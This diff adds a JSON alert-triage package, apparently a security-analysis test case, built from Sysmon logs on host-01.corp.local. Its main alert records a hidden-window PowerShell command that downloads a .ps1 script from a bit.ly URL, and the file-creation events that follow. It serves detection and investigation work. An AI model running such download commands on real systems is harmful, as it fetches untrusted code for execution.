@@ -1,0 +1,121 @@
+{
+  "schema_version": "1.0",
+  "case_id": "PS-002",
+  "package_type": "neutral_security_event_package",
+  "observed_context": {
+    "computers": [
+      "host-01.corp.local"
+    ],
+    "users": [
+      "corp\\Administrator"
+    ],
+    "time_window_utc": {
+      "start": "2020-11-20T09:36:07.061736400Z",
+      "end": "2020-11-20T09:40:21.103257600Z"
+    },
+    "event_count": 4,
+    "event_types_present": [
+      "file_create",
+      "process_create"
+    ],
+    "sourcetypes_present": [
+      "Microsoft-Windows-Sysmon/Operational"
+    ]
+  },
+  "main_alert": {
+    "evidence_id": "A0",
+    "is_triggering_alert": true,
+    "event_time_utc": "2020-11-20T09:40:20.782198600Z",
+    "event_type": "process_create",
+    "source_event": {
+      "provider": "Microsoft-Windows-Sysmon",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "event_code": 1,
+      "event_record_id": "14032"
+    },
+    "computer": "host-01.corp.local",
+    "attributes": {
+      "process_guid": "{E036F963-8F04-5FB7-0000-00105CD62200}",
+      "process_id": "1668",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "original_file_name": "PowerShell.EXE",
+      "command_line": "powershell  -WindowStyle hidden -c \"(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1')\"",
+      "current_directory": "C:\\Users\\Administrator\\",
+      "user": "corp\\Administrator",
+      "integrity_level": "High",
+      "hashes": "MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453",
+      "parent_process_guid": "{E036F963-8E07-5FB7-0000-0010BC122200}",
+      "parent_process_id": "2760",
+      "parent_image": "C:\\Windows\\System32\\cmd.exe",
+      "parent_command_line": "\"C:\\Windows\\system32\\cmd.exe\" "
+    }
+  },
+  "evidence_items": [
+    {
+      "evidence_id": "EV-001",
+      "event_time_utc": "2020-11-20T09:36:07.061736400Z",
+      "event_type": "process_create",
+      "source_event": {
+        "provider": "Microsoft-Windows-Sysmon",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "event_code": 1,
+        "event_record_id": "13586"
+      },
+      "computer": "host-01.corp.local",
+      "attributes": {
+        "process_guid": "{E036F963-8E07-5FB7-0000-0010BC122200}",
+        "process_id": "2760",
+        "image": "C:\\Windows\\System32\\cmd.exe",
+        "original_file_name": "Cmd.Exe",
+        "command_line": "\"C:\\Windows\\system32\\cmd.exe\" ",
+        "current_directory": "C:\\Users\\Administrator\\",
+        "user": "corp\\Administrator",
+        "integrity_level": "High",
+        "hashes": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
+        "parent_process_guid": "{E036F963-8D6D-5FB7-0000-0010B8B71A00}",
+        "parent_process_id": "3680",
+        "parent_image": "C:\\Windows\\explorer.exe",
+        "parent_command_line": "C:\\Windows\\Explorer.EXE /NOUACCHECK"
+      }
+    },
+    {
+      "evidence_id": "EV-002",
+      "event_time_utc": "2020-11-20T09:40:20.821729200Z",
+      "event_type": "file_create",
+      "source_event": {
+        "provider": "Microsoft-Windows-Sysmon",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "event_code": 11,
+        "event_record_id": "14041"
+      },
+      "computer": "host-01.corp.local",
+      "attributes": {
+        "process_guid": "{E036F963-8F04-5FB7-0000-00105CD62200}",
+        "process_id": "1668",
+        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "target_filename": "C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_tdane23i.lg4.ps1",
+        "creation_utc_time": "2020-11-20 09:40:20.808"
+      }
+    },
+    {
+      "evidence_id": "EV-003",
+      "event_time_utc": "2020-11-20T09:40:21.103257600Z",
+      "event_type": "file_create",
+      "source_event": {
+        "provider": "Microsoft-Windows-Sysmon",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "event_code": 11,
+        "event_record_id": "14046"
+      },
+      "computer": "host-01.corp.local",
+      "attributes": {
+        "process_guid": "{E036F963-8F04-5FB7-0000-00105CD62200}",
+        "process_id": "1668",
+        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "target_filename": "C:\\Users\\Administrator\\Default_File_Path.ps1",
+        "creation_utc_time": "2020-11-20 09:37:54.744"
+      }
+    }
+  ],
+  "deterministic_derivations": []
+}
